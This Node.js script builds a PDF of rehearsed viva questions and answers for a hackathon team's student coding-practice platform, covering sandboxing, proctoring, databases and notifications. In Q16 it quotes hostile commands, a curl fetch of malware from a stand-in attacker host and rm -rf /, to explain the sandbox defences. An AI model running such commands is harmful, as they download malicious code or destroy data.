const { jsPDF } = require('jspdf');
const fs = require('fs');
const path = require('path');

const doc = new jsPDF({
  orientation: 'portrait',
  unit: 'mm',
  format: 'a4',
  compress: true
});

const pageWidth = 210;
const pageHeight = 297;
const margin = 12;
const contentWidth = pageWidth - (margin * 2);
let y = margin;

function checkPage(neededHeight = 18) {
  if (y + neededHeight > pageHeight - 12) {
    doc.addPage();
    y = margin + 8;
    drawHeader();
  }
}

function drawHeader() {
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(7.5);
  doc.setTextColor(11, 37, 69);
  doc.text('SMART INDIA HACKATHON (SIH) — GRAND FINALE MASTER VIVA DEFENSE GUIDE', margin, margin);
  doc.setFont('helvetica', 'normal');
  doc.setTextColor(100, 116, 139);
  doc.text('Techsquad • VSB Engineering College • Department of IT', pageWidth - margin, margin, { align: 'right' });
  doc.setDrawColor(205, 215, 226);
  doc.setLineWidth(0.4);
  doc.line(margin, margin + 2, pageWidth - margin, margin + 2);
}

function addSectionTitle(title) {
  checkPage(18);
  y += 2.5;
  doc.setFillColor(241, 245, 249);
  doc.setDrawColor(28, 64, 110);
  doc.setLineWidth(0.6);
  doc.roundedRect(margin, y, contentWidth, 7, 1.2, 1.2, 'FD');
  
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(8.8);
  doc.setTextColor(11, 37, 69);
  doc.text(title.toUpperCase(), margin + 3.5, y + 4.8);
  y += 10;
}

function addQuestion(qNum, question, punchline, answer) {
  const qTitleLines = doc.splitTextToSize(`Q${qNum}. ${question}`, contentWidth - 4);
  const punchLines = doc.splitTextToSize(`Quick Take: ${punchline}`, contentWidth - 6);
  const ansLines = doc.splitTextToSize(answer, contentWidth - 6);

  const totalNeeded = (qTitleLines.length * 4.0) + (punchLines.length * 3.4) + (ansLines.length * 3.6) + 7;
  checkPage(Math.min(totalNeeded, 40));

  // Question Title
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(8.4);
  doc.setTextColor(15, 23, 42);
  doc.text(qTitleLines, margin + 2, y);
  y += (qTitleLines.length * 4.0) + 1.0;

  // Punchline Badge
  doc.setFillColor(254, 249, 195); // Amber-50
  doc.setDrawColor(234, 179, 8);   // Amber-500
  doc.setLineWidth(0.3);
  const pBoxH = (punchLines.length * 3.4) + 2.0;
  doc.roundedRect(margin + 2, y - 1.8, contentWidth - 4, pBoxH, 1, 1, 'FD');
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(7.4);
  doc.setTextColor(133, 77, 14);
  doc.text(punchLines, margin + 4, y + 0.8);
  y += pBoxH + 1.8;

  // Humanized Answer Body
  checkPage(ansLines.length * 3.6 + 3);
  doc.setFont('helvetica', 'normal');
  doc.setFontSize(8.0);
  doc.setTextColor(30, 41, 59);
  doc.text(ansLines, margin + 3, y);
  y += (ansLines.length * 3.6) + 4.0;
}

// ─────────────────────────────────────────────────────────────────────────────
// COVER / MASTER BANNER
// ─────────────────────────────────────────────────────────────────────────────
drawHeader();
y = margin + 6;

doc.setFillColor(11, 37, 69);
doc.roundedRect(margin, y, contentWidth, 26, 2, 2, 'F');

doc.setFont('helvetica', 'bold');
doc.setFontSize(11.5);
doc.setTextColor(255, 255, 255);
doc.text('SMART INDIA HACKATHON — MASTER VIVA VOCE ENCYCLOPEDIA', margin + 5, y + 7.5);

doc.setFontSize(8.2);
doc.setTextColor(226, 232, 240);
doc.text('Complete Merged Question Bank: 60+ Humanized, Conversational Answers for Grand Finale Defense', margin + 5, y + 14);

doc.setFontSize(7.2);
doc.setTextColor(148, 163, 184);
doc.text('Techsquad • VSB Engineering College (Autonomous), Karur • Department of IT • SIH26044', margin + 5, y + 20);

y += 30;

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 1: ELEVATOR PITCH & SYSTEM FOUNDATION
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('1. Elevator Pitch & Pedagogical Core');

addQuestion(
  1,
  "In 30 seconds, tell me what your project actually does.",
  "Closed-loop coding growth tracker.",
  "Sir, college exams test memorization once a semester, while students code every day on LeetCode and GitHub without getting academic credit. We built a platform that brings all this live coding into one place, automatically finds what topics a student is weak in, pairs them with a peer to fix it, and re-tests them to prove their skills actually grew."
);

addQuestion(
  2,
  "What is the single biggest problem you are solving?",
  "Bridging exam marks with real coding competency.",
  "Right now, there is zero connection between getting an 'A' grade in semester exams and actually being able to write bug-free code in an interview. Our platform turns random daily coding into verified proof that companies and colleges can trust."
);

addQuestion(
  3,
  "Who are the actual users and roles in your system?",
  "4-tier hierarchy for academic governance.",
  "We have 4 clean roles: Students (practice code, submit tasks, take tests), Class Advisors (verify student proofs and track section velocity), HODs (view department-wide skill heatmaps and analytics), and Industry Recruiters (post openings and run short coding qualifiers)."
);

addQuestion(
  4,
  "What is your tech stack and why did you choose it?",
  "Full-stack TypeScript for end-to-end type safety.",
  "We used React 19 and Tailwind on the frontend for speed, Monaco Editor for the in-browser IDE, Express with TypeScript on the backend, and PostgreSQL for strict relational ACID data. TypeScript across both frontend and backend means shared types and fewer runtime bugs."
);

addQuestion(
  5,
  "Your research question asks: 'Can peer learning measurably improve competency?' How do you measure it?",
  "Hake's Gain formula (g) with paired t-test.",
  "We use Hake's normalized learning gain formula: g = (PostScore - PreScore) / (100 - PreScore). If g is above 0.7, the learning gain is considered high. We prove it's statistically real using a paired t-test with a 95% confidence level (alpha = 0.05)."
);

addQuestion(
  6,
  "In peer programming, what stops one student from doing all the work while the other slacks off?",
  "Role rotation + Individual isomorphic re-test.",
  "Two things: First, we enforce time-boxed Driver-Navigator roles where write access switches every 15 minutes. Second, right after the collaborative session ends, both students must solve an individual isomorphic test alone. If a student freeloaded, they instantly fail the solo re-test."
);

addQuestion(
  7,
  "What is an 'isomorphic' question in plain English?",
  "Same logic, different story.",
  "It means keeping the exact same algorithmic logic, time complexity, and data structure, but changing the story and numbers. For example, changing 'Find two numbers that add up to a target' to 'Find two flight durations that match the layover time'. If they memorized the answer, they fail; if they understood the concept, they pass."
);

addQuestion(
  8,
  "How does your algorithm pair students? Why not pair top with bottom?",
  "Complementary skill matching, not top-with-bottom.",
  "Pairing top with bottom doesn't work—the topper gets frustrated and the struggling student feels shy. We pair students who have complementary strengths (Student A is good at Trees, Student B is good at DP). For remediation, we pair students with just a 15-20% skill gap so the explanation is relatable."
);

addQuestion(
  9,
  "How do you isolate your framework's effect from a good instructor or external YouTube tutorials?",
  "Quasi-experimental split-cohort design (N=60).",
  "We use a split-cohort study: 30 Control students and 30 Experimental students studying the exact same syllabus under the same faculty. The Control group uses traditional lab submissions; the Experimental group uses our closed-loop peer practice platform. Both take the exact same blinded isomorphic pre- and post-tests."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 2: CODE SANDBOX & COMPILATION (codingSandboxService.ts)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('2. Code Sandbox Execution Engine & Compilation');

addQuestion(
  10,
  "How does your backend run student code? Walk me through the lifecycle.",
  "Temp folder -> Compile -> Stdin feed -> Compare -> Clean up.",
  "When a student hits 'Submit', we create a fresh temp directory, write their code to disk, compile it using GCC, G++, or Javac, feed test inputs through stdin, compare the stdout with expected outputs, and delete the folder immediately in a finally block."
);

addQuestion(
  11,
  "What happens if a student writes an infinite loop like while(true)?",
  "Hard process timeout + SIGKILL.",
  "We don't wait forever. C, C++, and Python have a hard 4-second timeout, and Java has 6 seconds. If the timer expires, Node fires `child.kill('SIGKILL')`, terminates the process, and flags the test case as Time Limit Exceeded (TLE)."
);

addQuestion(
  12,
  "What if someone prints infinite characters like while(1) printf('A')?",
  "64 KB buffer clamp.",
  "In `codingSandboxService.ts`, our stdout/stderr listeners stop reading once the output hits 64 KB (65,536 bytes). This prevents the server's RAM from overflowing."
);

addQuestion(
  13,
  "Why is memory_used_kb showing 0 in your code?",
  "Honesty: child_process doesn't measure RSS cross-platform.",
  "Because Node's built-in `child_process.spawn` doesn't give accurate cross-platform peak RAM usage on Windows and Linux without third-party C++ bindings. Rather than faking numbers, we set it to 0 for now and enforce Time Limits. On our Linux production server, we read it via cgroups."
);

addQuestion(
  14,
  "What if a student writes class Solution instead of class Main in Java?",
  "Automatic regex AST rewrite.",
  "Java normally crashes if the filename doesn't match the public class name. In `codingSandboxService.ts`, our regex checks for `class Solution` or rewrites it to `public class Main` before saving, so `javac Main.java` compiles without silly errors."
);

addQuestion(
  15,
  "How do you hide hidden test cases from students inspecting browser network calls?",
  "Masked on the server before sending JSON.",
  "During sample runs, we only query `is_hidden = FALSE`. During final submissions, we run both public and hidden test cases, but the server strips actual output, expected output, and errors for hidden tests before sending the JSON response."
);

addQuestion(
  16,
  "What stops student code from running system('curl attacker.com/malware') or rm -rf /?",
  "Sanitized ENV + non-root container in production.",
  "In development, `SANITIZED_ENV` strips all cloud secrets and tokens from the process. In production deployment, we delegate the `runProcess` boundary to an isolated Docker container with network egress completely blocked (`--net=none`) and read-only filesystem mounts."
);

addQuestion(
  17,
  "Where does code actually compile if your frontend and API are hosted on Vercel?",
  "Dedicated background worker vs stateless API decoupling.",
  "Vercel serverless containers are lightweight and lack GCC/Java toolchains. Our architecture decouples web traffic from execution: Vercel serves the dashboards and auth, while heavy code execution is routed to our persistent Linux VPS or execution worker (`tsx server.ts`)."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 3: ANTI-CHEAT & PROCTORING (StudentCodingAssessmentView.tsx)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('3. Anti-Cheat & Monaco Proctoring Engine');

addQuestion(
  18,
  "How did you disable copy-pasting inside the Monaco editor?",
  "DOM capture phase + Keyboard shortcuts trap.",
  "Monaco uses internal shadow DOM where normal React events don't work. On mount, we grab `editor.getDomNode()` and attach native DOM listeners for `'paste'`, `'copy'`, and `'contextmenu'` with `useCapture = true`. We also intercept `Ctrl+V` and `Cmd+V` in `editor.onKeyDown` and block them."
);

addQuestion(
  19,
  "What anti-cheat violations do you record during an online coding test?",
  "5 real-time flags sent to DB audit log.",
  "We track: (1) Fullscreen exits via `document.fullscreenElement`, (2) Tab switches via `document.visibilitychange`, (3) Right-click attempts, (4) Clipboard paste attempts, and (5) Live webcam stream disconnections. Every violation increments a strike counter and logs to `coding_proctoring_events`."
);

addQuestion(
  20,
  "What if a student uses ChatGPT on a second device or phone?",
  "Live webcam feed + Strict time per problem.",
  "The webcam is mandatory and streams their face continuously. More importantly, we design micro-tasks with tight time constraints (15-20 minutes) and test code-modification or bug-fixing, where prompt-engineering an LLM on another screen takes longer than solving it."
);

addQuestion(
  21,
  "What happens if a student accidentally closes the browser during a test?",
  "Continuous autosave + Server-side countdown.",
  "Every few seconds, their code draft is autosaved to `coding_code_drafts` using an upsert query. When they re-open the link, their code is restored instantly. The timer is computed on the server from `deadline_at - NOW()`, so refreshing doesn't give extra time."
);

addQuestion(
  22,
  "What if a student tries running a Virtual Machine (VM) to bypass tab-switch tracking?",
  "Keystroke dynamics + Paste velocity flags.",
  "Even inside a VM, if a student copies code from the host, it appears in Monaco as a bulk paste (40 lines in 0.2 seconds). Our keyboard listeners flag paste velocity anomalies immediately for manual faculty audit."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 4: DATABASE ARCHITECTURE & SCALE (db.ts)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('4. Database Architecture & Scale (db.ts)');

addQuestion(
  23,
  "Why did you change Supabase port 5432 to port 6543?",
  "Port 5432 crashes on burst traffic; Port 6543 scales.",
  "Port 5432 is Session mode, which has a hard ceiling of 15-20 connections. If 60 students submit tests at once, the database throws `EMAXCONNSESSION` and crashes. Port 6543 uses Transaction mode (Supavisor), which borrows connections only for the split-second query and releases them, handling thousands of clients."
);

addQuestion(
  24,
  "Why set poolMax = 3 on Vercel but 25 on a normal server?",
  "Prevent serverless cold-starts from flooding Postgres.",
  "In serverless, each concurrent user request spins up a separate Node container. If 50 containers open 20 connections each, that's 1,000 connections, crashing the DB. Limiting each serverless instance to 2-3 connections keeps total pool connections well within limits."
);

addQuestion(
  25,
  "Why did you use pg.types.setTypeParser(20, ...)?",
  "Parse COUNT(*) directly as Numbers, not Strings.",
  "By default, Node's `pg` driver returns `COUNT(*)` as a string like `\"42\"` to prevent 64-bit precision loss. That forced us to write `parseInt()` everywhere. Parser 20 forces Postgres integers to return directly as numbers, making JSON responses faster and cleaner."
);

addQuestion(
  26,
  "What is Row Level Security (RLS) and why is it automated in your code?",
  "Prevents direct database tampering.",
  "In `initDB()`, our script loops through all tables in the `public` schema and enables RLS. This guarantees that even if someone finds our Supabase URL, they cannot query or tamper with tables without authorized service credentials."
);

addQuestion(
  27,
  "What happens when 200 students hit 'Submit' at the 59th minute simultaneously?",
  "Transaction pooling + async DB worker queue.",
  "Supabase Port 6543 handles query queuing smoothly. Because our database transactions hold connections for only 5-10 milliseconds to insert the submission and draft, all 200 writes complete in under 2 seconds without timing out."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 5: FILE EXPORTERS (ZIP, EXCEL, PDF)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('5. File Downloads: ZIP, Excel & PDF Task Proofs');

addQuestion(
  28,
  "Why generate ZIPs on the user's browser using JSZip instead of on your server?",
  "Saves server memory and prevents serverless timeouts.",
  "Downloading 100 high-res student screenshots on the server, zipping them, and sending them would eat hundreds of megabytes of server RAM and timeout after 10 seconds on Vercel. Doing it in the browser with `JSZip` takes zero server CPU and shows a smooth progress bar to faculty."
);

addQuestion(
  29,
  "How do you prevent CORS errors when downloading Cloudinary images into a ZIP?",
  "Direct CDN fetch first, then authenticated proxy fallback.",
  "The browser tries direct download first. If Cloudinary's CORS header blocks it, it falls back to our backend proxy: `/api/submissions/screenshot-proxy`. Our Express server downloads the image server-to-server and pipes it back with proper CORS headers."
);

addQuestion(
  30,
  "How does your screenshot-proxy prevent SSRF attacks?",
  "Strict Cloudinary domain whitelisting.",
  "In `server.ts`, we check `allowedHosts = ['res.cloudinary.com', 'cloudinary.com']`. If someone tries to pass `localhost` or internal cloud IPs, the server immediately returns HTTP 403 Forbidden."
);

addQuestion(
  31,
  "How does proofPdfGenerator.ts stop student proof screenshots from looking stretched?",
  "Aspect-ratio preserving math.",
  "It calculates the image's natural width/height ratio and compares it to the printable box on the A4 page. Whichever side is longer gets constrained, and the other side scales proportionally. The image is centered with a nice border, keeping 100% readability."
);

addQuestion(
  32,
  "What if an HOD downloads 500 screenshots and the browser tab crashes?",
  "Batch chunking (CHUNK_SIZE = 5) + Abort Controller.",
  "In `src/App.tsx`, we process images in small batches of 5 using `Promise.all` rather than firing 500 parallel connections. We also have an AbortController so faculty can pause or cancel without crashing the tab."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 6: EMAIL & TELEGRAM AUTOMATION
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('6. Email & Telegram Multi-Channel Automation');

addQuestion(
  33,
  "Why send emails via Brevo HTTPS REST API instead of traditional SMTP?",
  "Cloud hosts block SMTP ports 25 and 587; HTTPS Port 443 is never blocked.",
  "Platforms like Vercel and Render block raw SMTP ports to stop spammers. Brevo's HTTPS API runs over port 443 (regular web traffic), which works everywhere, has zero firewall issues, and delivers messages much faster."
);

addQuestion(
  34,
  "What happens if your free Brevo email quota runs out mid-day?",
  "Multi-node pool + Instant circuit-breaker failover.",
  "We have 3 Brevo accounts pooled together (giving 900 free emails/day). If Node 1 hits a 402 quota error, our circuit-breaker marks it offline for 2 hours and routes the email to Node 2. If all Brevo nodes run out, it falls back to Resend API, and finally to SMTP."
);

addQuestion(
  35,
  "How does 1-click Telegram linking work for a student?",
  "Deep link with JWT token.",
  "The student clicks 'Connect Telegram' on the website, which opens `t.me/IT_TaskManager_Alerts_bot?start=link_<JWT>`. When they tap Start, our bot verifies the token, grabs their Telegram Chat ID, saves it in Postgres, and confirms the link in 2 seconds."
);

addQuestion(
  36,
  "How do you stop duplicate Telegram alerts if multiple users click at 8:00 PM?",
  "Atomic daily database lock via claimDailySlot().",
  "Before sending daily alerts, the server runs an atomic `INSERT ... ON CONFLICT ... WHERE value IS DISTINCT FROM EXCLUDED.value RETURNING key`. Only the very first request gets a row back and sends the alerts; all other requests get 0 rows and exit immediately."
);

addQuestion(
  37,
  "On Vercel serverless, background timers freeze. How do your scheduled alerts fire?",
  "Opportunistic request-driven scheduler.",
  "Every incoming HTTP request to our API checks if 30 seconds have passed since the last check. If it's 8:00 PM and the evening reminders haven't run today, the incoming request triggers the alert in the background. No paid cron servers needed!"
);

addQuestion(
  38,
  "What happens if Telegram rate-limits your bot for broadcasting too fast?",
  "Sequential throttling + 429 backoff.",
  "Telegram allows 30 messages/sec. In `telegramService.ts`, we add small delays between 1-to-1 DMs. If a 429 error occurs, we inspect `retry_after` and back off. If Telegram is unavailable, notifications fall back to Email."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 7: AI SKILL GAP & PLACEMENT ENGINE (server.ts)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('7. AI Placement Readiness & Skill Gap Engine');

addQuestion(
  39,
  "Explain your 70/15/15 placement matching formula in simple words.",
  "70% verified skills, 15% college CGPA, 15% coding consistency.",
  "We don't score students on just marks. Core technical skills match carries 70% because that's what companies hire for. CGPA carries 15% for academic discipline. LeetCode problem solving carries 15% for algorithmic grit."
);

addQuestion(
  40,
  "Why did you use an exponential formula for LeetCode instead of simple division?",
  "Diminishing returns: 50 problems matter more than going from 800 to 850.",
  "Going from 0 to 50 problems teaches you immense logic, but going from 500 to 550 is just practice. Our formula `1 - exp(-N / 150)` gives steep score gains for early consistency and smoothly tops out around 350-400 problems, so students can't game the system by grinding 1,000 easy questions."
);

addQuestion(
  41,
  "How do you avoid string mismatch false negatives like 'React.js' vs 'React'?",
  "Skill alias normalization map.",
  "We clean the string to lowercase alphanumeric, and route synonyms through `SKILL_ALIASES` (e.g. `reactjs`, `react.js` -> `react`; `postgresql`, `mysql` -> `sql`). We also check two-way substring matching so 'Spring Boot' matches 'Spring'."
);

addQuestion(
  42,
  "How do you estimate how many weeks a student needs to bridge their skill gap?",
  "Gap depth * Domain complexity factor.",
  "For each missing skill, we multiply the skill deficit level by domain complexity (e.g. Docker is 2.5x, React is 2.0x, Machine Learning is 3.5x) and its weight in the job posting. This outputs a realistic, customized preparation timeline (e.g. '3 weeks to job-ready')."
);

addQuestion(
  43,
  "What if an exceptional developer has 0 LeetCode problems because they prefer GitHub projects?",
  "Weighted multi-source profile balances LeetCode.",
  "They lose only the 15% LeetCode bonus, but their GitHub commits and verified projects give them full marks on the 70% skills component. They can still achieve an 85% Super Dream placement score."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 8: ACCREDITATION & ACADEMIC AUDIT (NBA / NAAC)
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('8. NBA / NAAC Accreditation & Academic Rigor');

addQuestion(
  44,
  "Where are questions mapped to Bloom's Taxonomy levels in your database?",
  "Direct mapping in coding_questions schema.",
  "In `coding_questions`, difficulty is partitioned into cognitive tiers: 'EASY' maps to Bloom's Level 2-3 (Understand & Apply syntax), 'MEDIUM' maps to Level 4 (Analyze & Optimize), and 'HARD' maps to Level 5 (Evaluate edge constraints and Design algorithms), satisfying NBA Criterion 2 & 3."
);

addQuestion(
  45,
  "What if Peer Student A teaches Peer Student B bad habits or O(N^2) brute-force logic?",
  "Automated complexity and edge case test suites.",
  "The collaborative coding sandbox enforces strict execution timeouts (TLE). If Student A's brute-force $O(N^2)$ solution is passed to Student B, it instantly fails large hidden test cases ($N=10^5$), forcing both students to discard brute force and optimize."
);

addQuestion(
  46,
  "How do you explain a student with 2 past arrears but high LeetCode rank to an NBA auditor?",
  "Distinguishing theoretical exam arrears from applied skill.",
  "Our placement readiness report shows the breakdown clearly: theoretical semester exam gaps reflect examination pressure, while live telemetry proves applied algorithmic competence. NAAC loves this because it provides holistic student profiling."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 9: RECRUITER PORTAL & EDGE CASES
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('9. Recruiter Portal, System Resilience & Edge Cases');

addQuestion(
  47,
  "What stops a fake user from registering as an INDUSTRY recruiter and stealing student phone numbers?",
  "HOD / Admin manual verification gate.",
  "In `company_profiles`, every recruiter account is created with `is_verified = FALSE`. Unverified recruiters cannot view student contact information or download resumes until the college HOD verifies their official corporate email domain."
);

addQuestion(
  48,
  "How do you handle GitHub API commit sync conflicts when 60 students submit tasks?",
  "Batched daemon sync with exponential backoff.",
  "We don't fire 60 simultaneous Git commits on the same file. In `studentDirectoryService.ts`, progress sync is queued into a single background batch daemon that writes student directories sequentially, avoiding 409 conflict errors."
);

addQuestion(
  49,
  "How do you prevent server crashes when Cloudinary storage reaches its free tier limit?",
  "imageCleanupService 30-day automated purge.",
  "In `imageCleanupService.ts`, a daily background job scans `task_submissions` and purges screenshot proofs older than 30 days while keeping verified records in the database, ensuring storage never exceeds Cloudinary's free tier."
);

addQuestion(
  50,
  "How do you guarantee that 8:00 AM IST alerts fire accurately on servers running in UTC (like Vercel/AWS)?",
  "Intl.DateTimeFormat with Asia/Kolkata timezone.",
  "In `server.ts`, function `getISTTimeParts()` uses `Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Kolkata' })`. Regardless of whether the host server runs in US-East or London UTC, the hours and minutes are always parsed in Indian Standard Time."
);

addQuestion(
  51,
  "What happens if /logo.png fails to load when generating a proof PDF?",
  "Silent fallback to clean text-based layout.",
  "In `proofPdfGenerator.ts`, the logo fetch runs inside a `try...catch` block. If `/logo.png` returns a 404 or fails, `logoDataUrl` remains `null`, and the PDF renders a clean, typography-only institutional header without crashing."
);

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 10: TOUGH JURY TRAP QUESTIONS & COUNTER-ATTACKS
// ─────────────────────────────────────────────────────────────────────────────
addSectionTitle('10. Tough Jury Trap Questions & Closing Defense');

addQuestion(
  52,
  "LeetCode, HackerRank, and Canvas Moodle already exist. Why are you reinventing the wheel?",
  "They are disconnected silos; we built the complete closed loop.",
  "Sir, Moodle has assignments but zero code editor. LeetCode has problems but zero peer study circles or college curriculum alignment. None of them take daily commits from GitHub and LeetCode, find your gaps against college curriculum, pair you with a classmate, and re-test you to prove growth. That closed loop is our innovation."
);

addQuestion(
  53,
  "Students can just copy-paste answers from ChatGPT. How is your tool useful?",
  "We detect paste velocity, use webcam proctoring, and test debugging.",
  "You can't paste into our Monaco editor—DOM paste events and Ctrl+V are blocked and logged. More importantly, our micro-assessments give buggy code to fix or require students to explain space-time complexity under live peer walkthroughs, which ChatGPT copy-pasters fail at."
);

addQuestion(
  54,
  "Your server.ts file is 12,000 lines long. Isn't that messy programming?",
  "Tactical choice for serverless deployment; domain logic is fully modular.",
  "During the hackathon sprint, keeping route declarations in `server.ts` eliminated module-resolution errors across Vercel and Render deployments. But all our actual logic is cleanly separated: `codingSandboxService` runs compilers, `db.ts` handles pooling, `emailService` runs the email pool, and `telegramService` runs the bot."
);

addQuestion(
  55,
  "Are you doing too many things at once? Wouldn't a product focused on just the coding sandbox be better?",
  "An isolated sandbox reproduces the same silo problem we are solving.",
  "No, sir. If we built just a code sandbox, we would be another isolated LeetCode clone. The entire problem in higher education is fragmented data: attendance in one place, tasks on Google Drive, coding on LeetCode. Bringing them into a unified governance loop is what solves the accreditation and placement problem."
);

addQuestion(
  56,
  "How much does running this system cost the college per month?",
  "Essentially zero dollars on free tier infrastructure.",
  "We architected it for zero-cost operation: Vercel free tier for frontend and API, Supabase free tier for PostgreSQL, Brevo and Resend free tiers for 1,000+ daily emails, Telegram Bot API (100% free with unlimited messages), and Cloudinary free tier for proof storage."
);

addQuestion(
  57,
  "What is working right now vs what is just future planning?",
  "The full platform is live in production today.",
  "The entire platform is live today at `it-taskmanager.vercel.app`! You can create tasks, code in the Monaco IDE, compile C++/Java/Python, receive Telegram alerts, and download Excel/PDF reports right now. The only upcoming step is gathering longitudinal data from our N=60 student pilot cohort over the full semester."
);

// ─────────────────────────────────────────────────────────────────────────────
// FOOTER & NUMBERING PASS
// ─────────────────────────────────────────────────────────────────────────────
const totalPages = doc.internal.getNumberOfPages();
for (let i = 1; i <= totalPages; i++) {
  doc.setPage(i);
  doc.setFont('helvetica', 'normal');
  doc.setFontSize(7);
  doc.setTextColor(148, 163, 184);
  doc.setDrawColor(226, 232, 240);
  doc.setLineWidth(0.3);
  doc.line(margin, pageHeight - 8, pageWidth - margin, pageHeight - 8);
  doc.text('Smart India Hackathon (SIH) Master Viva Voce Defense Guide • Techsquad', margin, pageHeight - 4.5);
  doc.text(`Page ${i} of ${totalPages}`, pageWidth - margin, pageHeight - 4.5, { align: 'right' });
}

// ─────────────────────────────────────────────────────────────────────────────
// WRITE FILE
// ─────────────────────────────────────────────────────────────────────────────
const outputPath = path.join(__dirname, 'SIH_Grand_Finale_Master_Viva_Voce_Guide.pdf');
fs.writeFileSync(outputPath, Buffer.from(doc.output('arraybuffer')));
console.log(`[Success] Generated ${totalPages}-page Master Viva PDF: ${outputPath}`);
